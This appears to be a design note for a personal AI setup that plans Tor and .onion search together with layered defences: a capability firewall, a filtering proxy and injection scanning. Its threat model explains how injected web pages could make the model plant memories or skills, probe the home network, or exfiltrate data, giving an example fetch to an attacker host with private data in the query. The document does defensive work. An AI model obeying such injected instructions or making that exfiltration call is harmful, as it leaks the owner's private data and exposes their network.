# Web gateway: Tor, .onion and web-content safety (design, not built yet)

Status: design from research on 2026-10-07 against Open WebUI 0.11.4 and SearXNG
2026.10.2. Built only after the PC security check (Test-PCSecurity.ps1) is on main. The
owner wants .onion access; every safety layer below ships before Tor is switched on.

## Threat model

Fetched web text enters the model's context like a user message. A page can carry
instructions for the model (indirect prompt injection, OWASP LLM01). With tools available
(memory writes, the skill notebook, `fetch_url`) a successful injection can:

- persist: plant memories or skills that steer every later chat (OWASP LLM06, excessive agency);
- exfiltrate: make the model fetch `https://attacker/?d=<private data>` (Simon Willison's
  "lethal trifecta": private data + untrusted content + an outbound channel);
- probe the home network: fetch `http://192.168.x.x/...` (SSRF).

Malware risk is mostly indirect: pages are fetched as text (no JavaScript, HTML images not
downloaded), but `fetch_url` downloads non-HTML content (PDF, Office) into the document
loader. Unfiltered .onion search adds scams and illegal material (CSAM listings).

No detector stops all injections, so the design removes what an injection can do
(layers 1 and 2) and treats detection (layer 3) as a bonus.

## Facts that shape the design (verified in source unless noted)

- Open WebUI fetches search results with aiohttp (`retrieval/web/utils.py` SafeWebBaseLoader,
  honours `WEB_SEARCH_TRUST_ENV`, default True) and `fetch_url` with requests
  (`retrieval/utils.py:254-300`, always trusts the environment proxy).
- No SOCKS support in the Open WebUI image (no PySocks / aiohttp-socks): Tor must sit behind an
  HTTP proxy.
- Open WebUI rejects hosts that do not resolve, so `.onion` URLs fail unless
  `ENABLE_LOCAL_WEB_FETCH=true`, which also turns off its private-IP blocking. Behind a proxy
  it never checks the target IP anyway: the gateway must block private/loopback targets itself.
- A container-wide `HTTPS_PROXY` also affects Ollama, embeddings and SearXNG queries
  (`utils/session_pool.py:75` trust_env): `NO_PROXY` must list
  `render-guard,searxng,host.docker.internal,localhost,127.0.0.1`.
- `safe_web` reads whole bodies (no byte cap); `WEB_FETCH_MAX_CONTENT_LENGTH` only trims
  `fetch_url` text. The gateway caps size.
- SearXNG 2026.10.2 uses curl_cffi and accepts `socks5h://` proxies; `outgoing.using_tor_proxy`
  verifies Tor via check.torproject.org at start-up and switches engines to onion URLs. Onion
  engines: `ahmia` and `torch` (category `onions`, inactive without Tor). The `ahmia_filter`
  plugin drops results whose md5(host) is in the bundled `data/ahmia_blacklist.txt`
  (59,303 hashes); it is active only when `using_tor_proxy` is true. The `hostnames` plugin
  removes result domains by regex (small curated lists only).
- Builtin tool names in requests: `search_web`, `fetch_url`, `add_memory`, `update_memory`,
  `replace_memory_content`, `delete_memory`, `write_note`, `replace_note_content`,
  `create_automation`; the toolkit's notebook tool is `save_skill_draft`.
- The render guard parses the full `/api/chat` request (tool calls and `role: tool` results
  included) but streams responses as raw chunks; blocking a tool call needs line-by-line
  NDJSON buffering of `message.tool_calls`. Open WebUI only runs tool calls it receives.

## Layers

1. **Capability firewall (render guard).** In a turn whose context holds `search_web` /
   `fetch_url` results (or inlined RAG web results): drop memory, note, automation and
   `save_skill_draft` calls; allow `fetch_url` only for URLs that appeared in earlier results,
   and never with long query strings. The answer says what was blocked and how to save a
   memory by hand. Applies to every preset, Tor or not.
2. **Web gateway container** (Python, same pattern as the render guard): an HTTP/CONNECT
   proxy every web fetch goes through. Blocks private, loopback, link-local and
   Docker-internal targets after DNS resolution (DNS through Tor in Tor mode); nightly
   blocklists (URLhaus with the owner's free abuse.ch Auth-Key if given, OpenPhish community
   feed, a phishing domain list; md5 onion hashes from Ahmia / SearXNG's bundled list); text-like
   content types only (HTML, plain text, PDF up to a cap); byte cap; strips hidden text before it
   reaches the model where feasible; logs domains (no paths or queries) to
   `C:\AI\Logs\web-gateway.log`. Upstream: direct, or Tor's SOCKS port in Tor mode.
3. **Injection scanning (optional).** Pattern checks always; Llama Prompt Guard 2 (22M or 86M,
   512-token chunks, CPU) as an opt-in, because it needs a Hugging Face download and has
   false positives on benign instruction-like text. Flagged pages are dropped or wrapped
   with a warning.
4. **Tor and .onion (opt-in, Start-menu toggle).** A `tor` container built from Alpine's
   package (no third-party image). SearXNG: `outgoing.proxies` `all://: socks5h://tor:9050`,
   `using_tor_proxy: true`, `ahmia` on, `torch` off (no filtering), `enable_http` for onion
   engines. Open WebUI: `HTTP(S)_PROXY=http://web-gateway:<port>`, `NO_PROXY` as above,
   `ENABLE_LOCAL_WEB_FETCH=true` (safe only because the gateway enforces layer 2). Answers
   using onion sources are labelled.

## Licences and keys to confirm before building

URLhaus downloads need a free abuse.ch Auth-Key since 2025-06-30 (owner action, optional);
Phishing Army and OpenPhish community feeds are non-commercial (fine for a personal PC);
Prompt Guard 2 is under the Llama 4 Community License.

## Testing

Everything except real Tor connectivity can run in the sandbox: a stand-in upstream for the
gateway, fake blocklists, recorded tool-call streams for the render guard. Tor and onion search
are verified on the PC by the health check (a check.torproject.org probe through the gateway,
one Ahmia query).
